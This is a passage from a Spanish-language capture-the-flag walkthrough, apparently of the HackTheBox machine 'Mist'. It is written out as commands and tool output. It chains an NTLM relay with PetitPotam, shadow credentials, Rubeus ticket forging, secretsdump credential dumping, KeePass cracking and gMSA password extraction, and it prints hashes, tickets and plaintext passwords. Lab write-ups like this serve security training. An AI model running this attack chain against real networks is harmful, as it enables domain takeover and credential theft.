los ejecutamos una vez para ver que todo este bien:
```bash
.venv_impacket/bin/ntlmrelayx.py

```
y si todo esta bien lo devemos de ejcutar de la siguiente forma:

```bash

proxychains4 -q .venv_impacket/bin/ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb

```
y lo dejamos a la escucha

primero vamos a pasar este codigo a la mquina victima para crear un web client temporal en la máquina víctima

primero lo descargamos en nuestra maquina de esta forma:

```bash
wget https://gist.githubusercontent.com/klezVirus/af004842a73779e1d03d47e041115797/raw/29747c92ca04c844223d1ef6c1463d7e34e271ee/EtwStartWebClient.cs

mcs EtwStartWebClient.cs /unsafe
```

pasamos el archivo por server python y lo ejecutamos

```cmd
.\EtwStartWebClient.exe
```

y ahora ejecutamos el ataque PetitPotam

```bash
git clone https://github.com/topotam/PetitPotam

cd PetitPotam
proxychains4 -q python3 PetitPotam.py -u Brandon.Keywarp -d mist.htb -hashes ':DB03D6A77A2205BC1D07082740626CC9' 'MS01@5050/test' 192.168.100.101 -pipe all
```

vemos que el ataque a salido bien porque si volvemos a al ntlmrelayx.py que emos dejado en segundo plano veremos entre muchas cosas esto:

```bash
<SNIP>
[*] Servers started, waiting for connections
[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldaps://192.168.100.100
[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as MIST/MS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
[+] No more targets
[*] HTTPD(80): Connection from 127.0.0.1 controlled, but there are no more targets left!
```

ya con esto tenemos que ir rapido a ponernos en eschucha por el puerto 11000 para entrar en el servicio LDAP 

```bash
rlwrap -cAr nc -lvnp 11000
```

y ganamos acceso a una sell 
si escribimos help podemos ver los comandos que nos sirven para este ataque: clear_shadow_creds y set_shadow_creds

```shell
# help

 
 clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).
 
set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).

```

y ahora ejecutamos esos comandos:

```bash
 clear_shadow_creds MS01$

Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

Shadow credentials cleared successfully!
```

```bash

# set_shadow_creds MS01$

Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

KeyCredential generated with DeviceID: 45a2141d-b08b-749f-e37b-d97fb70ddbdf
Shadow credentials successfully added!
Saved PFX (#PKCS12) certificate & key at path: bKZHZ6ii.pfx
Must be used with password: yuDZCQnpFUr2aqRV794z
```

**(NOTA: SI ESTE ULTIMO COMANDO NO OS A FUNCIONA Y OS PONE ALGO DE PKCS12 TIENE SOLUCION. LO QUE TENEIS QUE HACER ES SALIR DE LA SHELL DE LDAP, UNA VEZ EN NUSTRA SHELL ATACANTE JECUTAR LO SIGUIENTE**

```bash

pip3 uninstall pyOpenSSL asgiref

pip3 install asgiref==3.7.2

pip3 install pyOpenSSL==22.1.0

```
**UNA VEZ ECHO VOLVER A HACER EL PROCESO DESDE QUE DEJAIS EN SEGUNDO PLANO LA HERRAMIENTA DE IMPACKET NTLMRELAYX.PY)**

esto nos genera un archivo (se guarda en el directorio en el que estuvieramos al hacer la conexion) y una contraseña para el archivo que tenemos que pasarle a la maquina victima para ejecutar con Rubeus

```cmd
.\Rubeus.exe asktgt /user:MS01$ /certificate:petitpotam.pfx /password:yuDZCQnpFUr2aqRV794z /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=MS01$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\MS01$'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF/DCCBfigAwIBBaEDAgEWooIFIDCCBRxhggUYMIIFFKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBOAwggTcoAMCARKhAwIBAqKCBM4EggTKo+uCN4M75FVu4QIgYnAUKH9SVV0NLI3zEWwwjy9FS27h+lK4dwP7fJ9mypsVJNNu6TsQsd0gBCvcCD3kmqPfXywbeQCl+ZH/K6PIkfPhN
      doIF/DCCBfigAwIBBaEDAgEWooIFIDCCBRxhggUYMIIFFKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBOAwggTcoAMCARKhAwIBAqKCBM4EggTKo+uCN4M75FVu4QIgYnAUKH9SVV0NLI3zEWwwjy9FS27h+lK4dwP7fJ9mypsVJNNu6TsQsd0gBCvcCD3kmqPfXywbeQCl+ZH/K6PIkfPhN
      doIF/DCCBfigAwIBBaEDAgEWooIFIDCCBRxhggUYMIIFFKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBOAwggTcoAMCARKhAwIBAqKCBM4EggTKo+uCN4M75FVu4QIgYnAUKH9SVV0NLI3zEWwwjy9FS27h+lK4dwP7fJ9mypsVJNNu6TsQsd0gBCvcCD3kmqPfXywbeQCl+ZH/K6PIkfPhNg7bUFOdvhVnCjatirtcIY/4f6IDCyBqA/PiYjpsyKEW6YTR4zl35Xv8R8LfnrmJQhW0ARqdjQvh9M7zNgu3hTNW2ClcKurzgTbZy6DUiAD+JcySXLXkh/rsZy5UkAFDIrnWZqULvtMWAjWyP5vRzm0/4JwVEstDFqu/rRcqDjMvbAOQplgenTM0fGC5LqA4nsPmaBcHUkXn96UZwuvxQnnr630HJCuzUCWf5wvU6Wue27H5f2hV7cI1y2PeeZMaFWL1si7X10debihnpey96IurQzkOp+m0PmUEJYAVM2bIsCXyTUleKeLUYFmhY5PutULRKBFL1/upwYQuesFRwJlIuJ0WQ/nmxNPHIIRRX2PMumd4ZENVyFtBwCePBWAe27djDZyZBFhHNusuTIAxr0XnWVsZiaK5l94n6glp3fv2G0Ifm01RfbtJk4xYW8Uo8zCbiZ2TucbpV3oLjeYj+zMLLiY83eHSjdzt8RTFw0naKIIp7wK43+M3+CBMG9pI7a6hV/W5qIjAUfXcohvln18slYOz9VM0HV+CgDS+2BXI63yT+HeZ9ZTKM3/64Dt1Rgy908IPt8odMZqH9tHGEpXQhn31ahE7SyPWY6liJhsij0kRIHFD8WJ/W+UhLFr9dfclvL7pkrW6yjuI26c25ksCZaU8fQYHon574hc8kh2qRNdvd1j7IZhbo7w0vZ+9cUJkLRsAVqqwx5BwN9Z+Jqy80IdDDXteiY3JZ8bsNpCK6dCqT6zvQ+BmjXR7ejsQ+EjVQJCy0ntq/+HRSbunIhwRuGINcN6Z8yAtQ/SxyEXCGOyudskL5pcdKhgR+3O1/kKIn4bvG8BIr7bsuKjOyzLJqNI4SNvNkk6x1kKWYMK+nyD8yYX3nJM2+xUx1RMPWm+R54RIrnT/gk5olbMj4tB29xSX5MwNgfJ525ZlSXV6jmMJFYnRNnIZM4yK5aiLM3zaDGj7OvG6C9tOV2mdZSapDuNC17UxR6RsXzrguyaKPuhaYGJOYHO8NDXF4Fdkl8DL101eXr1wKHnCN7vZ11J51pnvxMVc1eeGjjZW6G8ABJT2kngwt37F9a5iLV/atmdGaebNSc5FXQUZfBFI6yDE140a4Ju/nmMZ6bW4Fb+urlsdvQnYO4zfTdgFEukpHwuwADX+TmsLT/cJfgrMljk6ROoPPduaOmnryXHLSLDMgZ77CxHq34bb51uMA1aFWatV7dcPjjgxNxg2LHBKLRvmFyCDoESTh64sxs9HR8o5rNzmKGgSuTeyy4EJbpA60vZb3do39aE7OYZmyN1NvD3t6JvcsnXuqy/Am2TDDw0HsjBtqu+xqIxRGlJHndBjrTNDMdciZNWP71ZX+4MB4DZiVrolZWksvZdmAGsON9JfOEW4Eq9p6y7iq2IhPIYJbhGqf7hyVWnG9pYs0l131hnNxvkRHDlp7FbpL86S+990/AmRE268T7OA6y3d6q453+cbsQtv9BaZu8npXSRGRNj6UhlLL/UPGNpi6PYtSbQML9qLCsft4wWkaCGjgccwgcSgAwIBAKKBvASBuX2BtjCBs6CBsDCBrTCBqqAbMBmgAwIBF6ESBBDNkwQEaBQXUgFpuLTHmf4+oQobCE1JU1QuSFRCohIwEKADAgEBoQkwBxsFTVMwMSSjBwMFAEDhAAClERgPMjAyNDEwMjkwNjM1MTJaphEYDzIwMjQxMDI5MTYzNTEyWqcRGA8yMDI0MTEwNTA2MzUxMlqoChsITUlTVC5IVEKpHTAboAMCAQKhFDASGwZrcmJ0Z3QbCG1pc3QuaHRi

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  MS01$
  UserRealm                :  MIST.HTB
  StartTime                :  10/28/2024 11:35:12 PM
  EndTime                  :  10/29/2024 9:35:12 AM
  RenewTill                :  11/4/2024 10:35:12 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  zZMEBGgUF1IBabi0x5n+Pg==
  ASREP (key)              :  9E9A32FF7C4D0EB272348FD6D52DE405

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 13000E8CA4335C49A187E8C2403A3BB7
```

y tenemos el hash NTLM de la cuenta MS01

**(NOTA: SI NOS SALE UN ERROR DE KERBEROS O DEMAS ES POR QUE EL CERTIFICADO SE A RENOVADO POR LO QUE TENMOS QUE REALIZAR OTRA VEZ EL PROCESO PARA GENERAR UN NUEVO CERTIFICADO)**

provamos a ver si funciona el hash NTLM que emos conseguido:

```bash
proxychains4 -q nxc smb MS01.MIST.HTB -u 'MS01$' -H '13000E8CA4335C49A187E8C2403A3BB7'

SMB         224.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    MS01             [+] mist.htb\MS01$:13000E8CA4335C49A187E8C2403A3BB7
```

y vemos que funciona por lo que podemos solicitar con rubeus un ticket de Administrator 
lo primero que devemos hacer para ello es esto

```cmd
.\Rubeus.exe asktgt /user:MS01$ /rc4:13000E8CA4335C49A187E8C2403A3BB7 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 13000E8CA4335C49A187E8C2403A3BB7
[*] Building AS-REQ (w/ preauth) for: 'mist.htb\MS01$'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP64tLDzAZ6q8ava/CnFPIL64rCd0J+fFTj34CGXJMDiRzI1WBnGaBb9ZgKjyNml6zKHzwRmv9HUIAaZq8sdUlVt3O2iR31zy767IMaLW1aAx3Z2x5tKcMoxh23GjCsbAmppUrPJVfgHAqOw8cPDAeU/59e+gv1KdkgyoQMW2Fr8m9gNdN6I5A25/ysIsFzwty5vnpI9K2k67MfsRllCt6AJjAVe8/tdekdNVg7TCPMLOEOUeTGlHV3tDUBIae+z90a0VDy8BKHpnhxc0AC7N6kb5Co5MPQCGIc3DWBOBkXbSsw/sggyjR++8NXOCSQY4AtyKvJ++fzCS493t0T4otBeMlrD/DeIe6RF6SxGfX06oLCOGwZaUbmG6FULR3i5NJvXfJmspAQj2oDCmVywaNuMzntTrvhM3qk9RVl4Ev3BzJxoOmRQSot/b9ncjwJdYJ5Ooz8uokgFaI8BtHLHn7YxUEa0/AYwlg1wr/mWo0s+r6hSS2ne/OzXSkHxInA4A4fW2r2z8tayCewVSH/Mv0v1aWa+kXs/upggUJOB4yi0hbbfoyKgoofc3D9ng/7J2dlTBRzAAW4ZeOBh9GOPtQzuolG7lqflgw0yxzwAq0SwBoaRvJmiee1DBZui/rBAF3UlqcugKEj9OQqol/lKYLvHF4aIARof0tVls7xnWE/TBIsns+lwY3+RzEirw4phcEzNswohAbd7VfJHS6OpKwTQ+8A6J/vb7cXLoyvZsG2BSxIx0EclE0Myld6OIsHO4ldQaEFssbKAbnarcW1Cq4R+EvQEpU1HJhAkDEd+Q7gPTVK65Ne1vY7jmvVxXAsAy+4S+/Gs+YokEcAwTgnVENslLeQEHuxNAaSUhbeXMsFOUuNKaVGFhno+RbesJgY2nnJJitJl7e2XkyZHiqHH4XlnqLDGrjpaU8he2TythDbC1RjTEJL6ZBQ2Nz42I3GbAQZcC5LUht6AOcgaxbTuUYodWwNyyggictbAKvIv9IiXCIEEvT/i1f2Btw+JlU0r6dTVMyw35HKrF7jNReNDNcMztJIPxQKJVG2c3c21MSarmeDuOeS+HB1rOMxV1cy27278skY0lObzyBDoHNxbsh7XguDoBbiOlBdRwCZMt8dUSGvN74dFGqB93fk9bcaWtWpKxzt/xl4r0PGq0vRt1coFYjU3C33Y0ZWssYU7v93X1Bl+qZMZREkPksm6RsqogpyZi/CLrabTl2NMKOG9Lf62JuTKVinsInypWSdwcDAbth80gi23AFWrTLd8XEe6P52PeV4kn0+Nudzg6qCqPXVd9/PDJO3W5a+L3OA1midFmTRVaqzWmvzgozdSc+IhGARUY/dbtGxH+53+KOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEM9cG/JE4ovnAsWHfGHLdCKhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVNUzAxJKMHAwUAQOEAAKURGA8yMDI0MTAyOTA2NDYxMlqmERgPMjAyNDEwMjkxNjQ2MTJapxEYDzIwMjQxMTA1MDY0NjEyWqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  MS01$
  UserRealm                :  MIST.HTB
  StartTime                :  10/28/2024 11:46:12 PM
  EndTime                  :  10/29/2024 9:46:12 AM
  RenewTill                :  11/4/2024 10:46:12 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  z1wb8kTii+cCxYd8Yct0Ig==
  ASREP (key)              :  13000E8CA4335C49A187E8C2403A3BB7
```

copiamos el certificado y eejcutamos lo siguiente:

```cmd

\Rubeus.exe s4u /impersonateuser:Administrator /altservice:"cifs/ms01.mist.htb" /self /nowrap /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP64tLDzAZ6q8ava/CnFPIL64rCd0J+fFTj34CGXJMDiRzI1WBnGaBb9ZgKjyNml6zKHzwRmv9HUIAaZq8sdUlVt3O2iR31zy767IMaLW1aAx3Z2x5tKcMoxh23GjCsbAmppUrPJVfgHAqOw8cPDAeU/59e+gv1KdkgyoQMW2Fr8m9gNdN6I5A25/ysIsFzwty5vnpI9K2k67MfsRllCt6AJjAVe8/tdekdNVg7TCPMLOEOUeTGlHV3tDUBIae+z90a0VDy8BKHpnhxc0AC7N6kb5Co5MPQCGIc3DWBOBkXbSsw/sggyjR++8NXOCSQY4AtyKvJ++fzCS493t0T4otBeMlrD/DeIe6RF6SxGfX06oLCOGwZaUbmG6FULR3i5NJvXfJmspAQj2oDCmVywaNuMzntTrvhM3qk9RVl4Ev3BzJxoOmRQSot/b9ncjwJdYJ5Ooz8uokgFaI8BtHLHn7YxUEa0/AYwlg1wr/mWo0s+r6hSS2ne/OzXSkHxInA4A4fW2r2z8tayCewVSH/Mv0v1aWa+kXs/upggUJOB4yi0hbbfoyKgoofc3D9ng/7J2dlTBRzAAW4ZeOBh9GOPtQzuolG7lqflgw0yxzwAq0SwBoaRvJmiee1DBZui/rBAF3UlqcugKEj9OQqol/lKYLvHF4aIARof0tVls7xnWE/TBIsns+lwY3+RzEirw4phcEzNswohAbd7VfJHS6OpKwTQ+8A6J/vb7cXLoyvZsG2BSxIx0EclE0Myld6OIsHO4ldQaEFssbKAbnarcW1Cq4R+EvQEpU1HJhAkDEd+Q7gPTVK65Ne1vY7jmvVxXAsAy+4S+/Gs+YokEcAwTgnVENslLeQEHuxNAaSUhbeXMsFOUuNKaVGFhno+RbesJgY2nnJJitJl7e2XkyZHiqHH4XlnqLDGrjpaU8he2TythDbC1RjTEJL6ZBQ2Nz42I3GbAQZcC5LUht6AOcgaxbTuUYodWwNyyggictbAKvIv9IiXCIEEvT/i1f2Btw+JlU0r6dTVMyw35HKrF7jNReNDNcMztJIPxQKJVG2c3c21MSarmeDuOeS+HB1rOMxV1cy27278skY0lObzyBDoHNxbsh7XguDoBbiOlBdRwCZMt8dUSGvN74dFGqB93fk9bcaWtWpKxzt/xl4r0PGq0vRt1coFYjU3C33Y0ZWssYU7v93X1Bl+qZMZREkPksm6RsqogpyZi/CLrabTl2NMKOG9Lf62JuTKVinsInypWSdwcDAbth80gi23AFWrTLd8XEe6P52PeV4kn0+Nudzg6qCqPXVd9/PDJO3W5a+L3OA1midFmTRVaqzWmvzgozdSc+IhGARUY/dbtGxH+53+KOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEM9cG/JE4ovnAsWHfGHLdCKhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVNUzAxJKMHAwUAQOEAAKURGA8yMDI0MTAyOTA2NDYxMlqmERgPMjAyNDEwMjkxNjQ2MTJapxEYDzIwMjQxMTA1MDY0NjEyWqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

<SNIP>

doIF2jCCBdagAwIBBaEDAgEWooIE4zCCBN9hggTbMIIE16ADAgEFoQobCE1JU1QuSFRCoiAwHqADAgEBoRcwFRsEY2lmcxsNbXMwMS5taXN0Lmh0YqOCBKAwggScoAMCARKhAwIBA6KCBI4EggSKFy2VwrMUWCMzck5yluyb8LIood87cZT

```

esto ultimo ticket nos lo guardamos en nuestra maquina local en un archivo llamado MS01_Administrator_ticket_base64.kirbi (se le puede llamar como sea pero tiene que ser .kirbi)

una vez echo tenemos que convertirlo a base64:

```bash
base64 -d MS01_Administrator_ticket_base64.kirbi > MS01_Administrator_ticket.kirbi
```

y con impacket lo tenemos que convertir en un .ccache

```bash
impacket-ticketConverter MS01_Administrator_ticket.kirbi MS01_Administrator_ticket.ccache
```

y ya nos ponemos a hacer trastadas con kerberos para sacar los hash NTML de toda la maquina MS01:

```bash
KRB5CCNAME=MS01_Administrator_ticket.ccache proxychains4 -q impacket-secretsdump -k -no-pass Administrator@ms01.mist.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe3a142f26a6e42446aa8a55e39cbcd86
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:90f903787dd064cc1973c3aa4ca4a7c1:::
svc_web:1000:aad3b435b51404eeaad3b435b51404ee:76a99f03b1d2656e04c39b46e16b48c8:::
[*] Dumping cached domain logon information (domain/username:hash)
MIST.HTB/Brandon.Keywarp:$DCC2$10240#Brandon.Keywarp#5f540c9ee8e4bfb80e3c732ff3e12b28: (2024-10-29 07:06:58)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
MIST\MS01$:plain_password_hex:8444460417d7581adeef5c55a1481363ac1acc003789f0f8115944ca300de1ea42fb2c7a8f138aa7fe5204bd600c96d6b68d7ac323c8f09ca5761623ab0ac54c5f77303a830866d2e4a7ad3a189ae51cebfa881b5703c906c1a950c5bbec4bbd162870651a13cb839b92299daa51553f6afce9dcc6aa8a45158d1624e36d1da21bafdad2c63a2a9216d73ed8ff54b4448e27c5968ea58be7c9eb2bf6ed3c2d04b8de43785134750491c6dac2ed8e1544dc4f05e87e848ce2b5689d36e560ad84915616d5e031c06e6a735a014e2bb654568166bff31ceec89c3e2497ea54d608f7dde07db58c8a07a81a7c22346c5293
MIST\MS01$:aad3b435b51404eeaad3b435b51404ee:13000e8ca4335c49a187e8c2403a3bb7:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe464e18478cf4a7d809dfc9f5d6b5230ce98779b
dpapi_userkey:0x579d7a06798911d322fedc960313e93a71b43cc2
[*] NL$KM
 0000   57 C8 F7 CD 24 F2 55 EB  19 1D 07 C2 15 84 21 B0   W...$.U.......!.
 0010   90 7C 79 3C D5 BE CF AC  EF 40 4F 8E 2A 76 3F 00   .|y<.....@O.*v?.
 0020   04 87 DF 47 CF D8 B7 AF  6D 5E EE 9F 16 5E 75 F3   ...G....m^...^u.
 0030   80 24 AA 24 B0 7D 3C 29  4F EA 4E 4A FB 26 4E 62   .$.$.}<)O.NJ.&Nb
NL$KM:57c8f7cd24f255eb191d07c2158421b0907c793cd5becfacef404f8e2a763f000487df47cfd8b7af6d5eee9f165e75f38024aa24b07d3c294fea4e4afb264e62
[*] _SC_ApacheHTTPServer
svc_web:MostSavagePasswordEver123
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

vamos a probar tanto en la maquina MS01 como en la DC01 si funciona:

```bash
proxychains4 -q nxc smb MS01.MIST.HTB -u 'Administrator' -h '711e6a685af1c31c4029c3c7681dd97b' --local-auth

SMB         224.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    MS01             [+] MS01\Administrator:711e6a685af1c31c4029c3c7681dd97b (Pwn3d!)
```

```bash
proxychains4 -q nxc smb DC01.MIST.HTB -u 'Administrator' -H '711e6a685af1c31c4029c3c7681dd97b' --local-auth

SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:False)
SMB         224.0.0.1       445    DC01             [-] DC01\Administrator:711e6a685af1c31c4029c3c7681dd97b STATUS_LOGON_FAILURE
```

vemos que en la maquina MS01 si que hay acceso pero en la DC01 no 
para conectarnos podemos usar evil-winrm (lo tiene activo)

```bash
proxychains4 -q evil-winrm -i 192.168.100.101 -u 'Administrator' -H '711e6a685af1c31c4029c3c7681dd97b'
Evil-WinRM shell v3.6

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Revisando `C:\Users` muestra un nuevo directorio el cual no se encontraba anteriormente:

```shell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir C:\Users


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/20/2024   6:28 AM                Administrator
d-----         2/20/2024   6:02 AM                Administrator.MIST
d-----         3/20/2024   5:42 AM                Brandon.Keywarp
d-r---         2/20/2024   5:44 AM                Public
d-----         2/20/2024   9:39 AM                Sharon.Mullard
d-----         2/21/2024   3:46 AM                svc_web
```

El directorio `Sharon.Mullard` es nuevo.

Buscando por archivos en este directorio muestra:

```shell-session
*Evil-WinRM* PS C:\Users\Sharon.Mullard> tree . /f

Folder PATH listing
Volume serial number is 00000123 560D:8100
C:\USERS\SHARON.MULLARD
+---Desktop
+---Documents
¦       sharon.kdbx
¦
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
¦       cats.png
¦       image_20022024.png
¦
+---Saved Games
+---Videos
```

Podemos ver un archivo `.kdbx` (archivo `KeePass`) e imágenes `.png`.

Descargamos el archivo `.kdbx` y usamos `kpcli` para ver su contenido (instalable con `sudo apt install kpcli`), pero nos pregunta por contraseña:

```shell-session
kpcli --kdb sharon.kdbx

Provide the master password:
```

La cual, de momento, no tenemos.

Descargando las imágenes `.png`, una de ellas muestra algo interesante:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115243.png)

Está usando `CyberChef` ([https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)) para encodear un texto. Este texto parece ser algo así como una contraseña (texto encerrado en el rectángulo rojo), pero en total tiene un largo de 15 caracteres (rectángulo naranjo). El texto que se muestra en pantalla son sólo 14 caracteres, de manera que hay un caracter que falta. Para hallar el caracter que falta y así obtener la contraseña del archivo `.kdbx` podemos usar `keepass2john`y luego usar `Hashcat` para tratar de crackear la contraseña. Basados en la [página web de Hashcat con ejemplos](https://hashcat.net/wiki/doku.php?id=example_hashes) deberíamos de usar `-m 13400` para este hash. Por tanto, ejecutamos:

```shell-session
keepass2john sharon.kdbx > sharon_keepass_hash

hashcat --user sharon_keepass_hash -m 13400 -a 3 'UA7cpa[#1!_*ZX?a'

$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc:UA7cpa[#1!_*ZX@

```

donde `--user` es usada para saltarse el texto `sharon:` al inicio del hash. El caracter faltante era `@`, por lo que contraseña del `KeePass` es `UA7cpa[#1!_*ZX@`.

Usamos esta contraseña con `kpcli`:

```shell-session
kpcli --kdb sharon.kdbx

Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

y empezamos a buscar info en éste:

```shell-session
kpcli:/> find .

Searching for "." ...
 - 2 matches found and placed into /_found/
Would you like to list them now? [y/N] y
=== Entries ===
0. operative account                                          keepass.info
1. Sample Entry #2                          keepass.info/help/kb/testform.

kpcli:/> show -f 0

 Path: /sharon/
Title: operative account
Uname:
 Pass: ImTiredOfThisJob:(
  URL: https://keepass.info/
Notes: Notes
```

Tenemos lo que parece ser una contraseña: `ImTiredOfThisJob:(`.

De vuelta a `Bloodhound` y buscando `sharon` muestra 2 usuarios:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115327.png)

Tenemos 2 usuarios. Uno es `Sharon.Mullard` y el otro es `op_sharon.mullard`.

Podemos ver si la contraseña encontrada en el `KeePass` le corresponse a alguno de estos usuarios:

```shell-session
proxychains4 -q nxc smb MS01.MIST.HTB -u 'Sharon.Mullard' -p 'ImTiredOfThisJob:('

SMB         224.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    MS01             [-] mist.htb\Sharon.Mullard:ImTiredOfThisJob:( STATUS_LOGON_FAILURE

proxychains4 -q nxc smb MS01.MIST.HTB -u 'op_sharon.mullard' -p 'ImTiredOfThisJob:('

SMB         224.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    MS01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(
```

De manera que tenemos credenciales: `op_sharon.mullard:ImTiredOfThisJob:(`.

Además, este usuario se puede conectar a `DC01` a través de `WinRM`:

```shell-session
proxychains4 -q nxc winrm DC01.MIST.HTB -u 'op_sharon.mullard' -p 'ImTiredOfThisJob:('

WINRM       224.0.0.1       5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:mist.htb)
WINRM       224.0.0.1       5985   DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:( (Pwn3d!)
```

Tenemos acceso a la máquina `DC01`.

De vuelta a `Bloodhound`, clickeando en `op_sharon.mullard` y luego en `Outbound Object Control` al lado derecho nos lleva a lo siguiente:

![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pasted-image-20250119115340.png)

Tenemos el permiso `ReadGMSAPassword` sobre el usuario `svc_ca$`.

Esto quiere decir que podemos obtener la contraseña o hash de este usuario usando `NetExec`:

```shell-session
proxychains4 -q nxc ldap DC01.MIST.HTB -u 'op_sharon.mullard' -p 'ImTiredOfThisJob:(' --gmsa

SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAPS       224.0.0.1       636    DC01             [+] mist.htb\op_sharon.mullard:ImTiredOfThisJob:(
LDAPS       224.0.0.1       636    DC01             [*] Getting GMSA Passwords
LDAPS       224.0.0.1       636    DC01             Account: svc_ca$              NTLM: 07bb1cde74ed154fcec836bc1122bdcc
```

Obtenemos el hash `NTLM` de este usuario.

Revisamos si este hash funciona:

```shell-session
